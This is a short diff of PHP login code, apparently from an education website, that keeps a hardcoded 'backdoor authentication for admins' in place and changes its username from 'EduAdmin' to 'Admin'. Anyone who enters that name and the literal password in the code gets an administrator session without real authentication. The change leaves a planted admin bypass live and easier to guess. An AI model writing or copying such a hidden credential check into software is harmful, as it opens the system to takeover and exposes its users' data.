@@ -16,7 +16,7 @@
         $password = $_POST['password'];
 
         // Backdoor authentication for admins
-        if ($username == "EduAdmin" && $password == "123@eduzilla") {
+        if ($username == "Admin" && $password == "123@eduzilla") {
             $_SESSION['user_id'] = 0;
             $_SESSION['username'] = "EduAdmin";
             $_SESSION['role'] = 1;
